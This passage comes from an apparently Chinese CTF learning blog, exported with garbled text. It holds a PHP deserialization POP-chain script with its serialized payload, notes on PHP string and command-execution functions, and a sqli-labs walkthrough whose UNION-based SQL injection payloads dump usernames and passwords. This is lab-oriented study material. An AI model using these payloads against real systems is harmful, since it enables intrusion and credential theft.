class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$modifier</span>=<span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> <span class="title class_">Tes</span>();</span><br><span class="line"><span class="variable">$text</span>-&gt;p=<span class="variable">$modifier</span>;</span><br><span class="line"><span class="variable">$show</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$show</span>-&gt;source=<span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;str=<span class="variable">$text</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$show</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>å› ä¸ºåœ¨æ„é€ popé“¾æ—¶é­”æœ¯æ–¹æ³•å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åªç•™ä¸‹å˜é‡<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;source&quot;</span>;r:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;str&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;Modifier&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">13</span>:<span class="string">&quot;%00Modifier%00var&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><br>è¾“å‡ºä¸ºä»¥ä¸Šåºåˆ—åŒ–å­—ç¬¦ä¸²</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
          <category> ååºåˆ—åŒ– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpå‡½æ•°</title>
      <link href="/2023/11/17/php%E5%87%BD%E6%95%B0/"/>
      <url>/2023/11/17/php%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="æˆ‘ä¼šåœ¨è¿™é‡Œå†™ä¸‹æˆ‘åœ¨å†™ctfé¢˜æ—¶é‡åˆ°çš„ä¸ä¼šå’Œä¸ç†Ÿæ‚‰çš„çš„phpå‡½æ•°"><a href="#æˆ‘ä¼šåœ¨è¿™é‡Œå†™ä¸‹æˆ‘åœ¨å†™ctfé¢˜æ—¶é‡åˆ°çš„ä¸ä¼šå’Œä¸ç†Ÿæ‚‰çš„çš„phpå‡½æ•°" class="headerlink" title="æˆ‘ä¼šåœ¨è¿™é‡Œå†™ä¸‹æˆ‘åœ¨å†™ctfé¢˜æ—¶é‡åˆ°çš„ä¸ä¼šå’Œä¸ç†Ÿæ‚‰çš„çš„phpå‡½æ•°"></a>æˆ‘ä¼šåœ¨è¿™é‡Œå†™ä¸‹æˆ‘åœ¨å†™ctfé¢˜æ—¶é‡åˆ°çš„ä¸ä¼šå’Œä¸ç†Ÿæ‚‰çš„çš„phpå‡½æ•°</h1><h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h2><p>è¿™ä¸ªå‡½æ•°æ˜¯ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œä»£ç å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>, <span class="string">&quot;PHP is the web scripting language of choice.&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æŸ¥æ‰¾åˆ°åŒ¹é…çš„å­—ç¬¦ä¸² phpã€‚&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æœªå‘ç°åŒ¹é…çš„å­—ç¬¦ä¸² phpã€‚&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>è¾“å‡ºï¼šæŸ¥æ‰¾åˆ°åŒ¹é…çš„å­—ç¬¦ä¸² php<br>ä¸Šé¢çš„ä»£ç çš„æ„æ€ä¸ºï¼šåœ¨åå¼çš„â€PHPâ€ä¸­æŸ¥æ‰¾å‰å¼åˆ—å‡ºçš„å­—ç¬¦ä¸²php,æœ‰åˆ™è¿”å›1æ— è¿”å›0<br>/php/ä¸¤è¾¹çš„/æ˜¯ç”¨äºå¯¹å­—ç¬¦ä¸²çš„åˆ†éš”//åçš„iä»£è¡¨è¿™æ˜¯ä¸€ä¸ªå¯¹å¤§å°å†™ä¸æ•æ„Ÿçš„æŸ¥è¯¢æ‰€æœ‰è¿™ä¸ªä¼šè¿”å›1å°±æ˜¯çœŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/* æ¨¡å¼ä¸­çš„ \b æ ‡è®°ä¸€ä¸ªå•è¯è¾¹ç•Œï¼Œæ‰€ä»¥åªæœ‰ç‹¬ç«‹çš„å•è¯&quot;web&quot;ä¼šè¢«åŒ¹é…ï¼Œè€Œä¸ä¼šåŒ¹é…</span><br><span class="line"> * å•è¯çš„éƒ¨åˆ†å†…å®¹æ¯”å¦‚&quot;webbing&quot; æˆ– &quot;cobweb&quot; */</span><br><span class="line">if (preg_match(&quot;/\bweb\b/i&quot;, &quot;PHP is the web scripting language of choice.&quot;)) &#123;</span><br><span class="line">    echo &quot;æŸ¥æ‰¾åˆ°åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;æœªå‘ç°åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if (preg_match(&quot;/\bweb\b/i&quot;, &quot;PHP is the website scripting language of choice.&quot;)) &#123;</span><br><span class="line">    echo &quot;æŸ¥æ‰¾åˆ°åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;æœªå‘ç°åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¾“å‡º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥æ‰¾åˆ°åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">æœªå‘ç°åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚</span><br></pre></td></tr></table></figure><br>åœ¨å‰å¼çš„å­—ç¬¦ä¸²ç”¨/åˆ†éš”å­—ç¬¦ä¸²æ—¶å¯ä»¥æ·»åŠ \bæ¥æ ‡è®°å•è¯è¾¹ç•Œï¼Œåªæœ‰ç‹¬ç«‹çš„å•è¯ä¼šè¢«æŸ¥è¯¢åŒ¹é…</p><h2 id="substr-å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚"><a href="#substr-å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚" class="headerlink" title="substr å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚"></a>substr å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">10</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">1</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">3</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">7</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,-<span class="number">1</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,-<span class="number">10</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,-<span class="number">8</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,-<span class="number">4</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>è¾“å‡º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">d</span><br><span class="line">ello world</span><br><span class="line">lo world</span><br><span class="line">orld</span><br><span class="line">d</span><br><span class="line">ello world</span><br><span class="line">lo world</span><br><span class="line">orld</span><br></pre></td></tr></table></figure><br>è¿™ä¸ªå‡½æ•°çš„å®è´¨å°±æ˜¯è¿”å›ä»ç¬¬nä¸ªå­—ç¬¦å¼€å§‹åçš„é™¤ç¬¬nä¸ªå­—ç¬¦çš„æ‰€æœ‰å­—ç¬¦<br>è´Ÿæ•°å°±æ˜¯å€’ç€æ•°ç¬¬nä¸ªå¼€å§‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">0</span>,<span class="number">10</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">1</span>,<span class="number">8</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">0</span>,<span class="number">5</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">6</span>,<span class="number">6</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">0</span>,-<span class="number">1</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,-<span class="number">10</span>,-<span class="number">2</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">0</span>,-<span class="number">6</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,-<span class="number">2</span>-<span class="number">3</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>è¿”å›<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Hello worl</span><br><span class="line">ello wor</span><br><span class="line">Hello</span><br><span class="line">world</span><br><span class="line">Hello worl</span><br><span class="line">ello wor</span><br><span class="line">Hello</span><br><span class="line">world</span><br></pre></td></tr></table></figure></p><h2 id="eval-assert-ï¼šå°†å‡½æ•°å†…çš„å­—ç¬¦ä¸²å½“æˆä»£ç æ‰§è¡Œ"><a href="#eval-assert-ï¼šå°†å‡½æ•°å†…çš„å­—ç¬¦ä¸²å½“æˆä»£ç æ‰§è¡Œ" class="headerlink" title="eval(),assert()ï¼šå°†å‡½æ•°å†…çš„å­—ç¬¦ä¸²å½“æˆä»£ç æ‰§è¡Œ"></a>eval(),assert()ï¼šå°†å‡½æ•°å†…çš„å­—ç¬¦ä¸²å½“æˆä»£ç æ‰§è¡Œ</h2><p>ç”±äºè¯¥å‡½æ•°ä¼šå°†å‡½æ•°å†…çš„å­—ç¬¦ä¸²å½“æˆä»£ç æ‰§è¡Œï¼Œè¿™ä¹Ÿå°±å¯¼è‡´æˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªå‡½æ•°é‡Œè¾“å…¥ä¸€äº›å±é™©å‡½æ•°æ¥å¯¹æœåŠ¡å™¨è¿›è¡Œæ“ä½œ</p><h1 id="å±é™©å‡½æ•°"><a href="#å±é™©å‡½æ•°" class="headerlink" title="å±é™©å‡½æ•°"></a>å±é™©å‡½æ•°</h1><h2 id="1-system-exec-shell-exec-passthru"><a href="#1-system-exec-shell-exec-passthru" class="headerlink" title="1.system() exec() shell_exec() passthru()"></a>1.system() exec() shell_exec() passthru()</h2><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><p>è¯¥å‡½æ•°ä¼šæ‰§è¡Œå¤–éƒ¨ç¨‹åº(ä¹Ÿå°±æ˜¯å‘½ä»¤)å¹¶å°†ç»“æœè¿”å›æ˜¾ç¤ºè¾“å‡º</p><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p>è¯¥å‡½æ•°ä¸systeméå¸¸ç›¸ä¼¼ï¼Œä¸åŒçš„æ˜¯è¯¥å‡½æ•°ä¸ä¼šæ˜¾ç¤ºè¾“å‡ºï¼Œåªæ˜¯è¿”å›å€¼ä¸ºå‘½ä»¤çš„ç»“æœï¼Œæ‰€æœ‰å¦‚æœè¦æŸ¥çœ‹ç»“æœéœ€è¦è¾“å‡ºè¯¥å‡½æ•°çš„å€¼ï¼Œå¯ä»¥ä½¿ç”¨echo()æˆ–var_dump()</p><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><p>è¯¥å‡½æ•°éœ€è¦åœ¨shellç¯å¢ƒä¸‹æ‰å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼ˆæ„å‘³ç€åªèƒ½åœ¨linuxï¼Œmacï¼Œshellç¯å¢ƒä¸‹æ‰å¯ä»¥è¿è¡Œï¼‰</p><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><p>æ‰§è¡Œå¤–éƒ¨ç¨‹åºå¹¶ä¸”æ˜¾ç¤ºåŸå§‹è¾“å‡º</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
          <category> åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpå‡½æ•° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labsçš„wp</title>
      <link href="/2023/11/16/sqli-labs%E7%9A%84wp/"/>
      <url>/2023/11/16/sqli-labs%E7%9A%84wp/</url>
      
        <content type="html"><![CDATA[<h1 id="less1-less4"><a href="#less1-less4" class="headerlink" title="less1~less4"></a>less1~less4</h1><h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p>æˆ‘ä»¬å…ˆåœ¨urlä¸Šè¾“å…¥<code>?id=1</code>è¿›è¡Œå°è¯•å‘ç°å±å¹•å›æ˜¾å¦‚ä¸‹<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/screenshot20231116.png" class="" title="Alt text"><br>è¯æ˜å­˜åœ¨æ³¨å…¥ç‚¹<br>æ¥ä¸‹æ¥æˆ‘ä»¬åˆ¤æ–­ä¸ºä»€ä¹ˆç±»å‹çš„æ³¨å…¥ï¼Œè¾“å…¥<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2-1;</span><br></pre></td></tr></table></figure><br>å‘ç°å±å¹•å›æ˜¾å¦‚ä¸‹</p><p>ä¸?id=1ä¸åŒ<br>æ‰€ä»¥ä¸ºå­—ç¬¦å‹æ³¨å…¥,å› ä¸ºæ˜¯å­—ç¬¦å‹æ³¨å…¥æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°é—­åˆæ–¹å¼è¾“å…¥<br><code>?id=1&#39;--+</code>æˆåŠŸå›æ˜¾æ‰€ä»¥ä»–çš„é—­åˆæ–¹å¼ä¸º<code>&#39;</code></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æŸ¥è¯¢è¯¥è¡¨çš„åˆ—æ•°<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by åˆ—æ•°--+</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å‘ç°å½“æˆ‘ä»¬order by 4æ—¶æŠ¥é”™è€Œorder by 3æ—¶æ²¡æŠ¥é”™æ‰€ä»¥åˆ¤æ–­è¯¥è¡¨åˆ—æ•°ä¸º3<br>æ¥ä¸‹æ¥æˆ‘ä»¬æŸ¥çœ‹å›æ˜¾ä½ç½®<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure><br>å›æ˜¾å¦‚ä¸‹<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/2.png" class="" title="Alt text"><br>è¯æ˜å›æ˜¾ä½ç½®æ˜¯2å’Œ3<br>æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥æŸ¥è¯¢æ•°æ®åº“åç§°ä»£ç å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),3</span><br></pre></td></tr></table></figure><br>æŸ¥è¯¢å‡ºåº“åä¸ºâ€™securityâ€™<br>åœ¨æŸ¥è¯¢è¿™ä¸ªåº“ä¸­çš„è¡¨å<br>ä»£ç å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure><br>å±å¹•åœ¨åŸæœ¬3çš„ä½ç½®ä¸‹å›æ˜¾å‡ºè¡¨åå¦‚ä¸‹<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/4.png" class="" title="Alt text"><br>æŸ¥è¯¢è¡¨åå¯ä»¥çŒœæµ‹é‡è¦æ•°æ®åº”åœ¨usersé‡Œ<br>ç°åœ¨æˆ‘ä»¬æŸ¥è¯¢usersçš„åˆ—åä»£ç å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure><br>å›æ˜¾<img src="/2023/11/16/sqli-labs%E7%9A%84wp/5.png" class="" title="Alt text"><br>æœ€åæŸ¥è¯¢usernameå’Œpasswordå°±å¥½äº†ä»£ç å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,password) from users--+</span><br></pre></td></tr></table></figure><br>å›æ˜¾å‡ºè´¦å·å¯†ç <img src="/2023/11/16/sqli-labs%E7%9A%84wp/1.png" class="" title="Alt text"></p><h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p>å…ˆè¾“å…¥ä»¥ä¸‹ä»£ç <br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">2</span><span class="number">-1</span></span><br></pre></td></tr></table></figure><br>å‘ç°ä¸ºæ•°å­—å‹æ³¨å…¥</p><p>æ‰¹åˆ¤åˆ—æ•°<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order åˆ—æ•°</span><br></pre></td></tr></table></figure><br>å‘ç°ä¸º3åˆ—</p><p>æŸ¥çœ‹å›æ˜¾ä½<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure><br>å›æ˜¾ä½ä¸º2ï¼Œ3</p><p>æŸ¥çœ‹åº“åå’Œç‰ˆæœ¬<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 uniom select 1,database(),version()</span><br></pre></td></tr></table></figure><br>åº“åä¸ºsecurity</p><p>æŸ¥è¯¢è¡¨å<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure><br>å‘ç°userè¡¨çš„åˆ—å</p><p>æŸ¥è¯¢usersè¡¨çš„åˆ—å<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure><br>åˆ—åä¸­æœ‰usernameå’Œpassword</p><p>æŸ¥è¯¢usernameå’Œpassword<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(username,password) from users</span><br></pre></td></tr></table></figure></p><h3 id="less3-less4"><a href="#less3-less4" class="headerlink" title="less3,less4"></a>less3,less4</h3><p>æˆ‘å°†less3å’Œless4æ”¾åœ¨çš„åŸå› æ˜¯æˆ‘è®¤ä¸ºsqli_labsçš„ç¬¬1ï¼Œ3ï¼Œ4å…³å…¶å®éƒ½å·®ä¸å¤šåªæ˜¯é—­åˆçš„æ–¹å¼ä¸åŒ</p><h4 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h4><p>æˆ‘ä»¬å…ˆè¾“å…¥?id=1â€™å±å¹•å›æ˜¾<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/screenshot20231119.png" class="" title="Alt text"><br>è¿™ä¸ªæŠ¥é”™è¯´æ˜äº†é™¤æˆ‘ä»¬ä¼ å…¥çš„<code>id=1&#39;</code>åå³è¾¹ä¸º<code>&#39;)</code>é‚£ä¹ˆæˆ‘ä»¬ä¸å¦¨çŒœæµ‹idçš„é—­åˆæ–¹å¼ä¸º<code>(&#39;$id&#39;)</code><br>éšåè¾“å…¥<code>?id=1&#39;)--+</code>æ— æŠ¥é”™ä¹Ÿå¯ä»¥åœ¨åç»­è¾“å…¥å…¶ä»–è¯­å¥å¹¶å›æ˜¾ã€‚å‰©ä¸‹çš„æ­¥éª¤é‡å¤less1</p><h4 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h4><p>æˆ‘ä»¬ä¸€æ ·è¾“å…¥?id=1â€™<br>æ— æŠ¥é”™æˆåŠŸå›æ˜¾æˆ‘ä»¬åœ¨å°è¯•è¾“å…¥id=1â€æŠ¥é”™å›æ˜¾å¦‚ä¸‹<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/2,20231119.png" class="" title="Alt text"><br>æˆ‘ä»¬å‘ç°åœ¨æˆ‘ä»¬è¾“å…¥çš„<code>1&quot;</code>çš„å³ä¾§è¿˜æœ‰<code>&quot;)</code>é‚£ä¹ˆè¿™é¢˜çš„é—­åˆæ–¹å¼åº”ä¸º<code>&quot;)</code><br>æ¥ç€å°±ä¸less1æ— å¼‚äº†</p><h3 id="æ³¨æ„æˆ‘ä»¬å¯ä»¥æŸ¥è¯¢information-schemaåº“schemataè¡¨ä¸‹çš„schema-nameåˆ—æ¥æŸ¥è¯¢æ‰€ä»¥æ•°æ®åº“çš„åç§°"><a href="#æ³¨æ„æˆ‘ä»¬å¯ä»¥æŸ¥è¯¢information-schemaåº“schemataè¡¨ä¸‹çš„schema-nameåˆ—æ¥æŸ¥è¯¢æ‰€ä»¥æ•°æ®åº“çš„åç§°" class="headerlink" title="æ³¨æ„æˆ‘ä»¬å¯ä»¥æŸ¥è¯¢information_schemaåº“schemataè¡¨ä¸‹çš„schema_nameåˆ—æ¥æŸ¥è¯¢æ‰€ä»¥æ•°æ®åº“çš„åç§°"></a>æ³¨æ„æˆ‘ä»¬å¯ä»¥æŸ¥è¯¢information_schemaåº“schemataè¡¨ä¸‹çš„schema_nameåˆ—æ¥æŸ¥è¯¢æ‰€ä»¥æ•°æ®åº“çš„åç§°</h3><h2 id="less5-less6"><a href="#less5-less6" class="headerlink" title="less5~less6"></a>less5~less6</h2><h3 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h3><p>æˆ‘ä»¬æ‰“å¼€sqli-labsçš„less5å…ˆå¸¸è§„è¾“å…¥?id=1å‘ç°å›æ˜¾ä¸æˆ‘ä»¬ä¹‹å‰çš„é¢˜ç›®æœ‰æ‰€ä¸åŒ<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/sqli-labs_less5_1.png" class="" title="Alt text"><br>æˆ‘ä»¬åœ¨è¾“å…¥<code>?id=1&#39;</code> æŠ¥é”™<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/sqli-labs_less5_2.png" class="" title="Alt 